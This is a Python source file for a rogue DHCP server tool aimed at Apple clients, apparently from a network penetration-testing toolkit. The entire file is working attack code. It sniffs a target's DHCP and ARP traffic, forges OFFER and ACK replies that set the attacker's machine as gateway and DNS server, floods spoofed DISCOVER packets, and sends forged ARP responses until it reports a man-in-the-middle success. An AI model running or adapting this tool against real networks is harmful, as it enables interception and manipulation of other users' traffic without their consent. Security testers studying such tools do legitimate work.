#!/usr/bin/env python

from base import Base
from network import Ethernet_raw, ARP_raw, DHCP_raw
from sys import exit
from argparse import ArgumentParser
from ipaddress import IPv4Address
from scapy.all import Ether, ARP, BOOTP, DHCP, sniff, sendp
from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
from base64 import b64encode
from struct import pack
from netaddr import IPAddress
from tm import ThreadManager
from time import sleep

Base = Base()
Base.check_user()
Base.check_platform()

tm = ThreadManager(3)

parser = ArgumentParser(description='Apple DHCP Rogue server')

parser.add_argument('-i', '--interface', help='Set interface name for send DHCP reply packets')
parser.add_argument('-t', '--target_mac', help='Set target MAC address', required=True)
parser.add_argument('-I', '--target_ip', help='Set client IP address', required=True)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()

if not args.quiet:
    Base.print_banner()

eth = Ethernet_raw()
arp = ARP_raw()
dhcp = DHCP_raw()

current_network_interface = None
target_mac_address = str(args.target_mac).lower()
target_ip_address = str(args.target_ip)
transaction_id_global = 0
requested_ip = None
print_possible_mitm = False
print_success_mitm = False

if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IP address!"
    exit(1)

your_netmask = Base.get_netiface_netmask(current_network_interface)
if your_netmask is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have network mask!"
    exit(1)

your_broadcast = Base.get_netiface_broadcast(current_network_interface)
if your_broadcast is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have broadcast!"
    exit(1)

socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((current_network_interface, 0))


def make_dhcp_offer_packet(transaction_id, destination_ip=None):
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=your_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=your_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=target_ip_address,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=your_ip_address,
                                     lease_time=600,
                                     netmask=your_netmask,
                                     router=your_ip_address,
                                     dns=your_ip_address)


def make_dhcp_ack_packet(transaction_id, destination_ip=None):
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=your_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=your_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=target_ip_address,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=your_ip_address,
                                     lease_time=600,
                                     netmask=your_netmask,
                                     router=your_ip_address,
                                     dns=your_ip_address,
                                     dhcp_operation=5)


def dhcp_sender():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    offer_packet = make_dhcp_offer_packet(transaction_id_global)
    ack_packet = make_dhcp_ack_packet(transaction_id_global)

    while True:
        discover_packet = dhcp.make_discover_packet(source_mac=your_mac_address,
                                                    client_mac=eth.get_random_mac(),
                                                    host_name=Base.make_random_string(6))
        SOCK.send(discover_packet)
        SOCK.send(offer_packet)
        SOCK.send(ack_packet)
        sleep(0.05)


def dhcp_reply(request):
    global target_ip_address
    global target_mac_address
    global transaction_id_global
    global requested_ip
    global tm
    global socket_global
    global print_possible_mitm
    global print_success_mitm

    # DHCP REQUESTS
    if request.haslayer(DHCP):
        transaction_id = request[BOOTP].xid

        # DHCP DECLINE
        if request[DHCP].options[0][1] == 4:
            print Base.c_info + "DHCP DECLINE from: " + target_mac_address + " transaction id: " + hex(transaction_id)
            if transaction_id_global != 0:
                tm.add_task(dhcp_sender)

        # DHCP REQUEST
        if request[DHCP].options[0][1] == 3:
            if transaction_id != 0:
                transaction_id_global = transaction_id + 1
                print Base.c_info + "Current transaction id: " + hex(transaction_id)
                print Base.c_success + "Next transaction id: " + Base.cSUCCESS + hex(transaction_id_global) + Base.cEND
            for option in request[DHCP].options:
                if option[0] == "requested_addr":
                    requested_ip = str(option[1])
            print Base.c_info + "DHCP REQUEST from: " + target_mac_address + " transaction id: " + \
                hex(transaction_id) + " requested ip: " + requested_ip
            if requested_ip == target_ip_address:
                if not print_possible_mitm:
                    print Base.c_warning + "Possible MiTM success: " + \
                          Base.cWARNING + target_ip_address + " (" + target_mac_address + ")" + Base.cEND
                    print_possible_mitm = True

    # ARP REQUESTS
    if request.haslayer(ARP):
        if requested_ip is not None:
            if request[ARP].op == 1:
                if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":

                    if request[ARP].pdst == requested_ip:
                        print Base.c_info + "ARP request: Who has " + requested_ip + "?"
                        if requested_ip == target_ip_address:
                            if not print_possible_mitm:
                                print Base.c_warning + "Possible MiTM success: " + \
                                      Base.cWARNING + target_ip_address + " (" + target_mac_address + ")" + Base.cEND
                                print_possible_mitm = True
                        else:
                            arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                                          ethernet_dst_mac=target_mac_address,
                                                          sender_mac=your_mac_address, sender_ip=requested_ip,
                                                          target_mac=request[ARP].hwsrc, target_ip=request[ARP].psrc)
                            socket_global.send(arp_reply)
                            print Base.c_info + "ARP response: " + requested_ip + " is at " + your_mac_address

                    if request[ARP].pdst == your_ip_address:
                        print Base.c_info + "ARP request: Who has " + your_ip_address + "?"
                        if not print_success_mitm:
                            print Base.c_success + "MiTM success: " + \
                                  Base.cSUCCESS + target_ip_address + " (" + target_mac_address + ")" + Base.cEND
                            print_success_mitm = True
                        exit(0)


if __name__ == "__main__":
    print Base.c_info + "Waiting for ARP, DHCP DISCOVER, DHCP REQUEST or DHCP DECLINE from " + args.target_mac
    sniff(lfilter=lambda d: d.src == args.target_mac,
          filter="arp or (udp and src port 68 and dst port 67)",
          prn=dhcp_reply, iface=current_network_interface)
